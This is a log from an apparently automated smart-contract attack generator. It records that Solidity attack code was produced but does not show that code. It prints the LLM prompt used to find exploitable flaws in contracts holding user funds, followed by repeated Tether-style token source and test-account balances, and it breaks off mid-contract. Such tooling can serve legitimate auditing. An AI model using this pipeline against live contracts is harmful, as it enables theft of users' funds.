2025-06-23 14:31:37,058 - app.modules.attack_generator - INFO - Attack code generation completed in 8.82 seconds
2025-06-23 14:31:37,062 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 1239
2025-06-23 14:31:37,064 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 36.38 seconds
2025-06-23 14:31:37,066 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 14:31:37,079 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmprvx4kktw.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address 